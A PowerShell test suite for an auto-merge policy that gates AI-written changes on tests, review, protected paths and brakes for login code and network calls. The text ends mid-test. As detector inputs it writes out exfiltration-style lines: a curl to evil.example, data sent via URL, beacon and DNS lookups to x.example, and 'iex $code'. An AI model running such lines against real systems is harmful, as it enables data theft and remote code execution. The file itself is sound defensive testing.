# Tests for Jordan's auto-merge policy (kitchen/automerge.ps1) and the one-tap undo (kitchen/undo-merge.ps1): only small, tested,
# reviewed, non-private changes that touch no gate or guard merge on their own; an undo reverses a merge with a new commit. Self-cleaning.
$ErrorActionPreference = 'Stop'
$kd = (Resolve-Path (Join-Path $PSScriptRoot '..\kitchen')).Path
$root = Join-Path ([IO.Path]::GetTempPath()) ('kitchen-test-automerge-' + [guid]::NewGuid().ToString('N'))
$save = $env:BRAIN_KITCHEN
$saveTopic = $env:BRAIN_NTFY_TOPIC; $saveNLog = $env:KITCHEN_NOTIFY_LOG; $saveJob = $env:KITCHEN_JOB
$script:pass = 0; $script:fail = 0
function Check($n, $c) { if ($c) { $script:pass++ } else { $script:fail++; Write-Host "FAIL: $n" } }
function Am([string]$id) { (& pwsh -NoProfile -File (Join-Path $kd 'automerge.ps1') -Job $id -Json | Out-String) | ConvertFrom-Json }
# automerge measures the change with git itself (never the worktree's DIFF.patch/TESTS.txt, which AI-written code can rewrite), so each
# order gets a real branch kitchen/<id> in one test repo, an idea that names it, and a test result for its tip in results\<id>.tests.json
$ar = Join-Path $root 'amrepo'
function G { & git -C $ar -c user.name=t -c user.email=t@localhost -c core.autocrlf=false @args 2>&1 | Out-Null }
function Put([string]$rel, [string[]]$text) { $p = Join-Path $ar $rel; New-Item -ItemType Directory -Force -Path (Split-Path -Parent $p) | Out-Null; [IO.File]::WriteAllText($p, (($text -join "`n") + "`n")) }
function Idea([string]$job, [string]$src) { $p = Join-Path $root 'ideas.json'; $items = @(); if (Test-Path $p) { $items = @((Get-Content $p -Raw | ConvertFrom-Json).items) }; $items += [pscustomobject]@{ id = "I$($items.Count + 100)"; source = $src; job = $job }; @{ items = $items } | ConvertTo-Json -Depth 4 | Set-Content $p }
function Make([string]$id, [string]$files = 'docs/thing.md', [int]$lines = 10, [string]$last = 'ALL PASS', [string]$verdict = 'VERDICT: SHIP - checked the goal, tests and rules', [switch]$Private, [switch]$DeleteTest,
    [string[]]$add = @(), [string[]]$drop = @(), [scriptblock]$edit = $null, [string]$goal = '', [string]$source = 'Jordan', [string[]]$flaky = @(), [switch]$StaleSha, [string]$fakePatch = '', [string]$reviewer = 'gemini', [switch]$ReviewPrivate) {
    $steps = @(@{ script = 'x\worktree.ps1' }, @{ script = 'x\agent-step.ps1'; args = @{ Role = 'do'; Private = [bool]$Private } }, @{ script = 'x\agent-step.ps1'; args = @{ Role = 'check' } }, @{ script = 'x\merge.ps1'; approve = $true; args = @{ Repo = $ar } })
    @{ id = $id; name = "improve: $id"; recipe = 'improve'; status = 'pending'; cursor = 3; steps = $steps; vars = @{ goal = $goal } } | ConvertTo-Json -Depth 6 | Set-Content (Join-Path $root "jobs\$id.json")
    if ($source) { Idea $id $source }
    G checkout -q -B "kitchen/$id" main
    if ($files) { foreach ($f in $files -split ',') { Put $f @(1..$lines | ForEach-Object { "line $_" }) } }
    if ($add.Count) { Add-Content -LiteralPath (Join-Path $ar 'docs\base.md') -Value $add }
    if ($drop.Count) { $b = Join-Path $ar 'docs\base.md'; [IO.File]::WriteAllText($b, ((@(Get-Content $b) | Where-Object { $_ -notin $drop }) -join "`n") + "`n") }
    if ($DeleteTest) { G rm -q tests/Test-Old.ps1 }
    if ($edit) { & $edit }
    G add -A; G commit -q -m "change $id"
    $tested = (& git -C $ar rev-parse HEAD).Trim()
    if ($StaleSha) { Put 'docs/later.md' 'pushed after the tests ran'; G add -A; G commit -q -m later }
    G checkout -q main
    New-Item -ItemType Directory -Force -Path (Join-Path $root 'results') | Out-Null
    @{ job = $id; sha = $tested; final = $last; flaky = @($flaky) } | ConvertTo-Json -Compress | Set-Content (Join-Path $root "results\$id.tests.json")
    # the worktree's own files say all is well; automerge must not believe them
    $k = Join-Path $root "worktrees\$id\.kitchen"; New-Item -ItemType Directory -Force -Path $k | Out-Null
    Set-Content (Join-Path $k 'TESTS.txt') "PASS  Test-A`nALL PASS"
    Set-Content (Join-Path $k 'DIFF.patch') $(if ($fakePatch) { $fakePatch } else { "diff --git a/docs/x.md b/docs/x.md`n+++ b/docs/x.md`n+ok" })
    Set-Content (Join-Path $root "run\$id-s2-a0.log") "# In plain words`nfine`n$verdict"
    if ($reviewer) { @{ supplier = $reviewer; model = 'x'; private = [bool]$ReviewPrivate } | ConvertTo-Json | Set-Content (Join-Path $root "run\$id-s2-a0.cost.json") }
}
try {
    New-Item -ItemType Directory -Force -Path (Join-Path $root 'jobs'), (Join-Path $root 'run'), $ar | Out-Null
    $env:BRAIN_KITCHEN = $root
    G init -q -b main
    Put 'docs/base.md' @('# base', 'if (keyOk(k)) return;', 'Invoke-RestMethod -Uri $old'); Put 'tests/Test-Old.ps1' @('Check ''old'' $true')
    Put 'tests/Test-A.ps1' @('function Check($n, $c) { }', 'Check ''one'' $true', 'Check ''two'' $true', 'Write-Output ''done''')
    Put '.claude/settings.json' '{"permissions":{"deny":["Bash(rm:*)"]}}'; Put 'kitchen/stations/lint.ps1' '# lint'
    G add -A; G commit -q -m base
    Make 'J1'
    Set-Content (Join-Path $root 'kitchen.json') '{"autoMerge":{"on":false}}'
    Check 'policy off -> ask Jordan' (-not (Am 'J1').ok)
    Set-Content (Join-Path $root 'kitchen.json') '{"autoMerge":{"on":true,"maxLines":400}}'
    $r = Am 'J1'; Check 'small, tested, reviewed, unprotected -> auto-merge with a reason' ($r.ok -and $r.why -match 'tests all pass')
    # Jordan 2026-10-15: every kitchen script is protected; only Jordan's own ideas may merge on their own
    Make 'J41' -files 'kitchen/thing.ps1'; Check 'any kitchen script -> ask' (-not (Am 'J41').ok -and (Am 'J41').why -match 'protected')
    Make 'J42' -source 'research' -goal 'do it (Idea I5: from the web)'; Check 'an idea from research -> ask' (-not (Am 'J42').ok -and (Am 'J42').why -match 'came from research')
    Make 'J43' -goal 'do it (Idea I6: mine)'; Check "Jordan's own idea -> may auto-merge" ((Am 'J43').ok)
    # a repo's own kitchen.repo.json (read from the MAIN checkout): its protected globs, the file itself, and a config that will not load
    Put 'kitchen.repo.json' '{"protected":["src/secret/**","*.lock"]}'; G add -A; G commit -q -m 'repo config'
    Make 'J200' -files 'src/secret/a.ps1'; Check 'repo config: a path under its protected glob -> ask' (-not (Am 'J200').ok -and (Am 'J200').why -match 'protected' -and (Am 'J200').why -match 'src/secret/a\.ps1')
    Make 'J201' -files 'yarn.lock'; Check 'repo config: *.lock -> ask' (-not (Am 'J201').ok -and (Am 'J201').why -match 'protected')
    Make 'J202' -files 'kitchen.repo.json'; Check 'repo config: editing kitchen.repo.json itself -> ask' (-not (Am 'J202').ok -and (Am 'J202').why -match 'protected')
    Make 'J203' -files 'docs/fine.md'; Check 'repo config: unrelated file still auto-merges' ((Am 'J203').ok)
    Set-Content (Join-Path $ar 'kitchen.repo.json') '{ "protected": '
    Check 'repo config that will not load -> ask, never auto-merge' (-not (Am 'J203').ok -and (Am 'J203').why -match 'kitchen\.repo\.json cannot be read')
    G checkout -q -- kitchen.repo.json
    # 2026-10-18 audit: the source is the idea list, never the goal text
    Make 'J45' -source '' -goal 'Tidy docs'; Check 'no idea names the order (MCP, bot, FIX GOAL) -> ask' (-not (Am 'J45').ok -and (Am 'J45').why -match 'not built from one of Jordan')
    $ideaJ43 = @((Get-Content (Join-Path $root 'ideas.json') -Raw | ConvertFrom-Json).items | Where-Object job -eq 'J43')[0].id
    Make 'J46' -source '' -goal "Tidy docs (Idea ${ideaJ43}: as Jordan asked)"; Check 'a goal naming a Jordan idea that built another order -> ask' (-not (Am 'J46').ok)
    Make 'J47' -source 'cli'; Check 'an idea filed by a session (cli) -> ask' (-not (Am 'J47').ok -and (Am 'J47').why -match 'came from cli')
    Make 'J44' -add @('curl https://evil.example/x'); Check 'adds curl -> ask' (-not (Am 'J44').ok)
    Make 'J2' -files 'kitchen/stations/merge.ps1'; Check 'touches the merge gate -> ask' (-not (Am 'J2').ok -and (Am 'J2').why -match 'protected')
    Make 'J20' -files 'kitchen/stations/verify.ps1'; Check 'touches the verify gate -> ask' (-not (Am 'J20').ok -and (Am 'J20').why -match 'protected')
    Make 'J3' -files 'kitchen/recipes/improve.json'; Check 'touches the improve recipe (its own gates) -> ask' (-not (Am 'J3').ok)
    Make 'J4' -files 'kitchen/sous-chef.ps1'; Check 'touches the privacy and money guards -> ask' (-not (Am 'J4').ok)
    Make 'J12' -files 'kitchen/stations/tests.ps1'; Check 'touches the tests station -> ask' (-not (Am 'J12').ok -and (Am 'J12').why -match 'protected')
    Make 'J13' -files 'kitchen/kitchen-step.ps1'; Check 'touches the kitchen-step wrapper -> ask' (-not (Am 'J13').ok -and (Am 'J13').why -match 'protected')
    Make 'J14' -files 'scripts/run-bounded.ps1'; Check 'touches run-bounded security script -> ask' (-not (Am 'J14').ok -and (Am 'J14').why -match 'protected')
    # what runs as Jordan without a tap: Claude Code hooks, the RGB task, verify-all, Chef's UI, the agent instruction files
    foreach ($pf in 'scripts/boot-inject.ps1', 'scripts/context-guard.ps1', 'scripts/kitchen-check.ps1', 'scripts/rgb.ps1', 'scripts/verify-all.json', 'scripts/verify-all.ps1', 'pass-app/public/app.js', 'pass-app/public/index.html', 'CLAUDE.md', 'GEMINI.md', '.claude/hooks/x.ps1', 'kitchen/kitchen.json') {
        Make 'J60' -files $pf; Check "touches $pf -> ask" (-not (Am 'J60').ok -and (Am 'J60').why -match 'protected')
    }
    # renames and odd names: git lists both sides of a rename and never quotes, so nothing hides
    Make 'J61' -files '' -edit { New-Item -ItemType Directory -Force -Path (Join-Path $ar 'tests\old') | Out-Null; G mv tests/Test-A.ps1 tests/old/Test-A.ps1 }; Check 'renames a test suite into a subfolder -> ask' (-not (Am 'J61').ok -and (Am 'J61').why -match 'renames a test')
    Make 'J62' -files '' -edit { G mv tests/Test-A.ps1 tests/Test-A.ps1.off }; Check 'renames a test suite out of the glob -> ask' (-not (Am 'J62').ok -and (Am 'J62').why -match 'renames a test')
    Make 'J63' -files '' -edit { G mv .claude/settings.json docs-settings.json }; Check 'renames a protected file away -> ask' (-not (Am 'J63').ok -and (Am 'J63').why -match '\.claude/settings\.json')
    Make 'J64' -files '' -edit { G mv kitchen/stations/lint.ps1 docs/lint.ps1 }; Check 'moves a gate script out of the protected folder -> ask' (-not (Am 'J64').ok -and (Am 'J64').why -match 'protected')
    Make 'J65' -files '.claude/skills/my skill/SKILL.md'; Check 'protected path with a space -> ask' (-not (Am 'J65').ok -and (Am 'J65').why -match 'protected')
    Make 'J66' -files ".claude/caf$([char]0xE9).md"; Check 'protected path with a non-ASCII name -> ask' (-not (Am 'J66').ok -and (Am 'J66').why -match 'protected')
    Make 'J67' -files 'kitchen/automerge.ps1' -fakePatch "diff --git a/docs/a.md b/docs/a.md`n+++ b/docs/a.md`n+tiny"; Check 'a rewritten DIFF.patch in the worktree cannot hide a protected change' (-not (Am 'J67').ok -and (Am 'J67').why -match 'automerge')
    # existing tests: only new test files or pure additions merge alone
    Make 'J68' -files 'tests/Test-New.ps1'; Check 'adds a new test file -> may auto-merge' ((Am 'J68').ok)
    Make 'J69' -files '' -edit { Add-Content (Join-Path $ar 'tests\Test-A.ps1') "Check 'three' `$true" }; Check 'adds a Check to an existing test -> may auto-merge' ((Am 'J69').ok)
    Make 'J70' -files '' -edit { Put 'tests/Test-A.ps1' @('function Check($n, $c) { }', 'Check ''one'' $true', 'Write-Output ''done''') }; Check 'removes a line from an existing test -> ask' (-not (Am 'J70').ok -and (Am 'J70').why -match 'existing test')
    Make 'J71' -files '' -edit { Put 'tests/Test-A.ps1' @('function Check($n, $c) { }', 'exit 0', 'Check ''one'' $true', 'Check ''two'' $true', 'Write-Output ''done''') }; Check 'adds an early exit to an existing test -> ask' (-not (Am 'J71').ok -and (Am 'J71').why -match 'early exit')
    # the test result must be for this exact commit, with no suite passing only on a retry
    Make 'J72' -StaleSha; Check 'branch moved after its tests ran -> ask' (-not (Am 'J72').ok -and (Am 'J72').why -match 'changed after')
    Make 'J73' -flaky @('Test-KitchenSupervisor'); Check 'a suite passed only on its retry -> ask' (-not (Am 'J73').ok -and (Am 'J73').why -match 'retry')
    Remove-Item (Join-Path $root 'results\J1.tests.json'); Check 'no test result outside the worktree -> ask (TESTS.txt is not trusted)' (-not (Am 'J1').ok -and (Am 'J1').why -match 'no test results'); Make 'J1'
    Make 'J5' -lines 500; Check 'too big -> ask' (-not (Am 'J5').ok -and (Am 'J5').why -match 'too big')
    Make 'J6' -last 'FAILED: Test-A'; Check 'tests not all passing -> ask' (-not (Am 'J6').ok)
    Make 'J7' -verdict 'VERDICT: REWORK - broken'; Check 'reviewer did not say ship -> ask' (-not (Am 'J7').ok)
    # a SHIP that came on a retry right after a REWORK of the same change overrules a reviewer: Jordan taps (a rework round in between is fine)
    $hist = { param($id, $h) $jp = Join-Path $root "jobs\$id.json"; $jj = Get-Content $jp -Raw | ConvertFrom-Json -AsHashtable; $jj.history = $h; $jj | ConvertTo-Json -Depth 6 | Set-Content $jp }
    Make 'J84'; & $hist 'J84' @(@{ step = 2; outcome = 'taster'; detail = "red flag in the output: 'VERDICT: REWORK'" })
    Check 'SHIP after a REWORK of the same change -> ask' (-not (Am 'J84').ok -and (Am 'J84').why -match 'REWORK')
    Make 'J85'; & $hist 'J85' @(@{ step = 2; outcome = 'taster'; detail = "red flag in the output: 'VERDICT: REWORK'" }, @{ step = 2; outcome = 'rework' })
    Check 'SHIP after a rework round -> may auto-merge' ((Am 'J85').ok)
    Make 'J86'; & $hist 'J86' @(@{ step = 2; outcome = 'taster'; detail = "expected 'VERDICT' in the output; not found" })
    Check 'SHIP after a reviewer that gave no verdict -> may auto-merge' ((Am 'J86').ok)
    Make 'J8' -Private; Check 'a private order -> ask' (-not (Am 'J8').ok)
    # only a cloud reviewer's SHIP counts (J50: the local 9b model said SHIP on a 337-line diff it could not open)
    Make 'J81' -reviewer 'local'; Check 'SHIP from the local model -> ask' (-not (Am 'J81').ok -and (Am 'J81').why -match 'local model')
    Make 'J82' -reviewer ''; Check 'no receipt for the review -> ask' (-not (Am 'J82').ok -and (Am 'J82').why -match 'receipt')
    Make 'J83' -ReviewPrivate; Check 'review step the sous chef saw as private -> ask' (-not (Am 'J83').ok -and (Am 'J83').why -match 'private')
    Make 'J9' -DeleteTest; Check 'deletes a test file -> ask' (-not (Am 'J9').ok -and (Am 'J9').why -match 'deletes or renames a test')
    Set-Content (Join-Path $root 'kitchen.json') '{"autoMerge":{"on":true,"protect":["^docs/private/"]}}'
    Make 'J10' -files 'docs/private/x.md'; Check 'Jordan can protect more paths' (-not (Am 'J10').ok)

    # brake 1: daily cap autoMerge.perDay (default 12)
    Set-Content (Join-Path $root 'kitchen.json') '{"autoMerge":{"on":true}}'
    $log = Join-Path $root 'automerged.jsonl'
    1..12 | ForEach-Object {
        @{ at = (Get-Date).ToUniversalTime().ToString('o'); job = "Jold$_"; why = 'test' } | ConvertTo-Json -Compress
    } | Set-Content -LiteralPath $log -Encoding utf8
    $rCap = Am 'J1'
    Check 'daily cap reached (default 12) -> ask Jordan' (-not $rCap.ok -and $rCap.why -match 'daily.*cap|cap')
    Set-Content (Join-Path $root 'kitchen.json') '{"autoMerge":{"on":true,"perDay":15}}'
    $rCap15 = Am 'J1'
    Check 'Jordan can raise the daily cap via kitchen.json' ($rCap15.ok -and $rCap15.why -match 'tests all pass')
    # yesterday's merges (local calendar day) do not count toward today's cap
    $yest = (Get-Date).Date.AddMinutes(-30).ToUniversalTime().ToString('o')
    Set-Content (Join-Path $root 'kitchen.json') '{"autoMerge":{"on":true}}'
    1..12 | ForEach-Object { @{ at = $yest; job = "Jy$_"; why = 'test' } | ConvertTo-Json -Compress } | Set-Content -LiteralPath $log -Encoding utf8
    Check 'merges from yesterday do not count toward today cap' ((Am 'J1').ok)
    # 11 today -> the 12th still goes; 12 today -> stops
    1..11 | ForEach-Object { @{ at = (Get-Date).ToUniversalTime().ToString('o'); job = "Jt$_"; why = 'test' } | ConvertTo-Json -Compress } | Set-Content -LiteralPath $log -Encoding utf8
    Check '11 merges today: the 12th is still allowed' ((Am 'J1').ok)
    1..12 | ForEach-Object { @{ at = (Get-Date).ToUniversalTime().ToString('o'); job = "Jt$_"; why = 'test' } | ConvertTo-Json -Compress } | Set-Content -LiteralPath $log -Encoding utf8
    Check '12 merges today: stop' (-not (Am 'J1').ok)
    Remove-Item -LiteralPath $log -Force -ErrorAction SilentlyContinue
    # default is off when the config omits autoMerge entirely
    Set-Content (Join-Path $root 'kitchen.json') '{}'
    Check 'auto-merge defaults to off when unconfigured' ((Am 'J1').why -eq 'auto-merge is off')
    Set-Content (Join-Path $root 'kitchen.json') '{"autoMerge":{"on":true}}'

    # brake 2: pause auto-merge for 24 h after any undone or merge.undone entry
    @{ at = (Get-Date).ToUniversalTime().ToString('o'); job = 'J99'; undone = 'deadbeef' } | ConvertTo-Json -Compress | Set-Content -LiteralPath $log -Encoding utf8
    $rPause = Am 'J1'
    Check 'undone merge within 24 h pauses auto-merge' (-not $rPause.ok -and $rPause.why -match 'pause')
    @{ at = (Get-Date).AddHours(-25).ToUniversalTime().ToString('o'); job = 'J99'; undone = 'deadbeef' } | ConvertTo-Json -Compress | Set-Content -LiteralPath $log -Encoding utf8
    $rOldUndo = Am 'J1'
    Check 'undone merge older than 24 h does not pause' ($rOldUndo.ok)
    @{ at = (Get-Date).ToUniversalTime().ToString('o'); job = 'J98'; type = 'merge.undone' } | ConvertTo-Json -Compress | Set-Content -LiteralPath $log -Encoding utf8
    $rTypeUndo = Am 'J1'
    Check 'merge.undone entry pauses auto-merge' (-not $rTypeUndo.ok -and $rTypeUndo.why -match 'pause')
    Remove-Item -LiteralPath $log -Force -ErrorAction SilentlyContinue
    # brake 2b: verify's fallback undo record (undo-merge could not write its own) and a flaky check on main both pause, and count toward no cap
    @{ at = (Get-Date).ToUniversalTime().ToString('o'); job = 'J97'; undone = 'unknown'; type = 'merge.undone'; why = 'broke main (Test-X)' } | ConvertTo-Json -Compress | Set-Content -LiteralPath $log -Encoding utf8
    Check "verify's fallback undo record pauses auto-merge" (-not (Am 'J1').ok -and (Am 'J1').why -match 'pause')
    Check "verify writes its fallback undo record so automerge sees an undo" ((Get-Content (Join-Path $kd 'stations\verify.ps1') -Raw) -match "undone = 'unknown'; type = 'merge.undone'")
    @{ at = (Get-Date).ToUniversalTime().ToString('o'); job = 'J96'; type = 'automerge.pause'; why = 'passed only on a retry (Test-X)' } | ConvertTo-Json -Compress | Set-Content -LiteralPath $log -Encoding utf8
    $rFl = Am 'J1'; Check 'a flaky check on main pauses auto-merge for 24 h' (-not $rFl.ok -and $rFl.why -match 'pause' -and $rFl.why -match 'flaky')
    @{ at = (Get-Date).AddHours(-25).ToUniversalTime().ToString('o'); job = 'J96'; type = 'automerge.pause' } | ConvertTo-Json -Compress | Set-Content -LiteralPath $log -Encoding utf8
    Check 'a flaky pause older than 24 h no longer pauses' ((Am 'J1').ok)
    Remove-Item -LiteralPath $log -Force -ErrorAction SilentlyContinue

    # brake 3: ask Jordan when diff touches login or key handling
    Make 'J20' -add @('function keyOk(k) {}'); Check 'touches keyOk -> ask' (-not (Am 'J20').ok -and (Am 'J20').why -match 'login|key')
    Make 'J21' -add @('if (!authed(req)) return;'); Check 'touches authed -> ask' (-not (Am 'J21').ok -and (Am 'J21').why -match 'login|key')
    Make 'J22' -add @('const user = tailscaleUser(req);'); Check 'touches tailscaleUser -> ask' (-not (Am 'J22').ok -and (Am 'J22').why -match 'login|key')
    Make 'J23' -add @('const list = allowedUsers();'); Check 'touches allowedUsers -> ask' (-not (Am 'J23').ok -and (Am 'J23').why -match 'login|key')
    Make 'J24' -add @('const k = read(''pass-key.txt'');'); Check 'touches pass-key -> ask' (-not (Am 'J24').ok -and (Am 'J24').why -match 'login|key')
    Make 'J25' -add @('res.setHeader(''Set-Cookie'', ''...'');'); Check 'touches Set-Cookie -> ask' (-not (Am 'J25').ok -and (Am 'J25').why -match 'login|key')
    Make 'J26' -add @('''Content-Security-Policy'': ''default-src self'''); Check 'touches Content-Security-Policy -> ask' (-not (Am 'J26').ok -and (Am 'J26').why -match 'login|key')
    Make 'J27' -add @('X-Frame-Options: DENY'); Check 'touches X-Frame-Options -> ask' (-not (Am 'J27').ok -and (Am 'J27').why -match 'login|key')
    Make 'J28' -drop @('if (keyOk(k)) return;'); Check 'removed line touching login code -> ask' (-not (Am 'J28').ok -and (Am 'J28').why -match 'login|key')

    # brake 4: ask Jordan when diff adds a network call
    Make 'J30' -add @('const r = fetch(''/api'');'); Check 'adds fetch( -> ask' (-not (Am 'J30').ok -and (Am 'J30').why -match 'network')
    Make 'J31' -add @('Invoke-WebRequest -Uri $u'); Check 'adds Invoke-WebRequest -> ask' (-not (Am 'J31').ok -and (Am 'J31').why -match 'network')
    Make 'J32' -add @('Invoke-RestMethod -Uri $u'); Check 'adds Invoke-RestMethod -> ask' (-not (Am 'J32').ok -and (Am 'J32').why -match 'network')
    Make 'J33' -add @('const api = ''https://api.external.com'';'); Check 'adds URL to new host -> ask' (-not (Am 'J33').ok -and (Am 'J33').why -match 'network')
    Make 'J34' -add @('$u = ''http://127.0.0.1:11434/api/ps'';'); Check 'local 127.0.0.1 URL -> allowed' ((Am 'J34').ok)
    Make 'J35' -add @('$u = ''http://localhost:7878/api/stream'';'); Check 'local localhost URL -> allowed' ((Am 'J35').ok)
    Make 'J36' -drop @('Invoke-RestMethod -Uri $old'); Check 'removed network call does not trigger brake' ((Am 'J36').ok)
    # 2026-10-18 audit: forms the first regex missed (sockets, beacons, protocol-relative navigation, code loading, DNS)
    $n = 80
    foreach ($nl in 'const ws = new WebSocket(u);', 'navigator.sendBeacon(u, d);', 'location.href = ''//x.example/?d='' + data', 'iex $code', 'require(''node:net'').connect(9)', 'https.get(u, cb)', 'Resolve-DnsName "$d.x.example"', '[Net.Sockets.TcpClient]::new(h, 1)', 'git remote add x u', 'api(''/api/action'', { op: ''approve'', id })') {
        $n++; Make "J$n" -add @($nl); Check "adds '$nl' -> ask" (-not (Am "J$n").ok -and (Am "J$n").why -match 'network')
    }
    Make 'J95' -add @('// see the docs for details', 'a comment // e.g. this one'); Check 'an ordinary comment is not a network call' ((Am 'J95').ok)

    # undo: a revert commit restores the code; asking twice is refused
    $g = Join-Path $root 'repo'; New-Item -ItemType Directory -Force -Path $g | Out-Null
    & git -C $g init -q -b main 2>&1 | Out-Null; Set-Content (Join-Path $g 'a.txt') 'before'
    & git -C $g add a.txt 2>&1 | Out-Null; & git -C $g -c user.name=t -c user.email=t@localhost commit -q -m base 2>&1 | Out-Null
    & git -C $g checkout -q -b kitchen/J11 2>&1 | Out-Null; Set-Content (Join-Path $g 'a.txt') 'after'
    & git -C $g -c user.name=t -c user.email=t@localhost commit -qam change 2>&1 | Out-Null; & git -C $g checkout -q main 2>&1 | Out-Null
    & git -C $g -c user.name=t -c user.email=t@localhost merge -q --no-ff kitchen/J11 -m 'Merge kitchen/J11 (kitchen J11, approved by Jordan)' 2>&1 | Out-Null
    Check 'setup: merged' ((Get-Content (Join-Path $g 'a.txt') -Raw).Trim() -eq 'after')
    $u = (& pwsh -NoProfile -File (Join-Path $kd 'undo-merge.ps1') -Job J11 -Repo $g -Json | Out-String) | ConvertFrom-Json
    Check 'undo: code restored by a new commit (history kept)' ($u.ok -and (Get-Content (Join-Path $g 'a.txt') -Raw).Trim() -eq 'before' -and (& git -C $g log -1 --format=%s) -match '^Undo J11')
    $u2 = (& pwsh -NoProfile -File (Join-Path $kd 'undo-merge.ps1') -Job J11 -Repo $g -Json | Out-String) | ConvertFrom-Json
    Check 'undo twice is refused' (-not $u2.ok)
    $uPause = Am 'J1'
    Check 'after undo-merge: auto-merge paused for 24 h' (-not $uPause.ok -and $uPause.why -match 'pause')

    # the merge commit says who said yes: an auto-merge never claims Jordan's tap
    & git -C $g checkout -q -b kitchen/J31 2>&1 | Out-Null; Set-Content (Join-Path $g 'c.txt') 'auto'
    & git -C $g add c.txt 2>&1 | Out-Null; & git -C $g -c user.name=t -c user.email=t@localhost commit -qm auto 2>&1 | Out-Null; & git -C $g checkout -q main 2>&1 | Out-Null
    @{ id = 'J31'; name = 'improve: J31'; recipe = 'improve'; status = 'running'; cursor = 3; approval = @{ id = 'auto'; kind = 'auto'; granted = $true } } | ConvertTo-Json -Depth 4 | Set-Content (Join-Path $root 'jobs\J31.json')
    $env:KITCHEN_JOB = 'J31'; $null = & pwsh -NoProfile -File (Join-Path $kd 'stations\merge.ps1') -Repo $g 2>&1; $env:KITCHEN_JOB = $null
    Check 'merge message: an auto-merge says so' ((& git -C $g log -1 --format=%s) -eq "Merge kitchen/J31 (kitchen J31, auto-merged under Jordan's policy)")

    # post-merge verify: breaks main -> undone, merge.undone event emitted, Jordan alerted, automerged.jsonl updated
    $vr = Join-Path $root 'verify-repo'; New-Item -ItemType Directory -Force -Path (Join-Path $vr 'tests') | Out-Null
    Set-Content (Join-Path $vr 'good.txt') 'ok'
    Set-Content (Join-Path $vr 'tests\Test-Suite1.ps1') "if (`$env:FLAKY_MARK -and (Test-Path `$env:FLAKY_MARK)) { `$n = [int](Get-Content `$env:FLAKY_MARK); if (`$n -le 1) { Remove-Item `$env:FLAKY_MARK } else { Set-Content `$env:FLAKY_MARK (`$n - 1) }; exit 3 }`nif (Test-Path `"`$PSScriptRoot\..\broken.txt`") { Write-Output 'FAIL: broken.txt exists'; exit 1 }`nWrite-Output 'Suite1: 1 passed, 0 failed'; exit 0"
    & git -C $vr init -q -b main 2>&1 | Out-Null
    & git -C $vr add -A 2>&1 | Out-Null
    & git -C $vr -c user.name=t -c user.email=t@localhost commit -q -m "initial commit" 2>&1 | Out-Null

    # Create kitchen/J12 with a breaking change and merge into main
    & git -C $vr checkout -q -b kitchen/J12 2>&1 | Out-Null
    Set-Content (Join-Path $vr 'broken.txt') 'breaks the test suite'
    & git -C $vr add -A 2>&1 | Out-Null
    & git -C $vr -c user.name=t -c user.email=t@localhost commit -q -m "breaking feature" 2>&1 | Out-Null
    & git -C $vr checkout -q main 2>&1 | Out-Null
    & git -C $vr -c user.name=t -c user.email=t@localhost merge -q --no-ff kitchen/J12 -m 'Merge kitchen/J12 (kitchen J12, approved by Jordan)' 2>&1 | Out-Null
    $j12MergeSha = (& git -C $vr rev-parse HEAD).Trim()

    $notifyLog = Join-Path $root 'notify.log'
    $env:BRAIN_NTFY_TOPIC = 'test-topic-12345'
    $env:KITCHEN_NOTIFY_LOG = $notifyLog
    $env:KITCHEN_JOB = 'J12'

    Set-Content (Join-Path $root 'exemplars.jsonl') '{"job":"J12","goal":"breaking change"}'

    $verifyScript = Join-Path $kd 'stations\verify.ps1'
    # the merge train: verify hands it back on every verdict (pass or undo); a hold for Jordan keeps it
    . (Join-Path $kd 'train.ps1'); $trainP = Get-TrainPath $root $vr; function Hold-Train($jid) { @{ job = $jid; at = [DateTime]::UtcNow.ToString('o') } | ConvertTo-Json -Compress | Set-Content $trainP }; Hold-Train 'J12'
    $vOut = & pwsh -NoProfile -File $verifyScript -Repo $vr 2>&1 | Out-String
    $vCode = $LASTEXITCODE

    Check 'verify fails when main broken: exit 1' ($vCode -eq 1)
    Check 'verify undo: the merge train is released' (-not (Test-Path $trainP))
    Check 'verify undo: undo commit added to main' ((& git -C $vr log -1 --format=%s) -match '^Undo J12')
    Check 'verify undo: files on main restored' (-not (Test-Path (Join-Path $vr 'broken.txt')) -and (Test-Path (Join-Path $vr 'good.txt')))
    $events = @(Get-Content (Join-Path $root 'events.jsonl') -ErrorAction SilentlyContinue | ForEach-Object { try { $_ | ConvertFrom-Json } catch { } })
    $undoneEv = @($events | Where-Object { $_.type -eq 'merge.undone' -and $_.job -eq 'J12' })
    Check 'verify: events.jsonl has merge.undone event for J12' ($undoneEv.Count -eq 1 -and $undoneEv[0].suites -contains 'Test-Suite1')
    $nContent = if (Test-Path $notifyLog) { Get-Content $notifyLog -Raw } else { '' }
    Check 'verify: notify.log alerted Jordan with safe text' ($nContent -match 'HIGH\|test-topic-12345\|J12 was undone: it broke main')
    $amRecords = @(Get-Content (Join-Path $root 'automerged.jsonl') -ErrorAction SilentlyContinue | ForEach-Object { try { $_ | ConvertFrom-Json } catch { } })
    $amJ12 = @($amRecords | Where-Object { $_.job -eq 'J12' -and $_.undone -eq $j12MergeSha })
    Check 'verify: automerged.jsonl has undo record with why' ($amJ12.Count -ge 1 -and $amJ12[-1].why -match 'broke main')
    $exContent = if (Test-Path (Join-Path $root 'exemplars.jsonl')) { Get-Content (Join-Path $root 'exemplars.jsonl') -Raw } else { '' }
    Check 'verify: exemplar for broken J12 was purged' ($exContent -notmatch '"job":"J12"')

    # verify checks main as committed: with uncommitted edits in the checkout, or the checkout on another branch, it holds for Jordan
    # (exit 10): nothing tested, nothing undone, the merge train stays held
    $env:KITCHEN_JOB = 'J14'
    & git -C $vr checkout -q -b kitchen/J14 2>&1 | Out-Null
    Set-Content (Join-Path $vr 'broken.txt') 'breaks it again'
    & git -C $vr add -A 2>&1 | Out-Null; & git -C $vr -c user.name=t -c user.email=t@localhost commit -q -m "breaking again" 2>&1 | Out-Null
    & git -C $vr checkout -q main 2>&1 | Out-Null
    & git -C $vr -c user.name=t -c user.email=t@localhost merge -q --no-ff kitchen/J14 -m 'Merge kitchen/J14 (kitchen J14, approved by Jordan)' 2>&1 | Out-Null
    Set-Content (Join-Path $vr 'good.txt') 'someone is editing this'
    Hold-Train 'J14'
    $vOut14 = & pwsh -NoProfile -File $verifyScript -Repo $vr 2>&1 | Out-String
    Check 'verify, uncommitted edits on main: the merge train stays held' ((Get-Content $trainP -Raw | ConvertFrom-Json).job -eq 'J14')
